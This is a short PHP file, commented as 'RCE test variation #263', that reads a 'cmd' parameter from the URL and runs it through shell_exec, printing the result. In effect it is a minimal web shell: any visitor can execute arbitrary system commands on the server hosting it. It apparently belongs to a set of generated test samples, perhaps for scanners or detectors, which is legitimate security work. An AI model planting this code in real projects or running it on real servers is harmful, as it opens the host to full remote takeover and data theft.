<?php
// RCE test variation #263
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>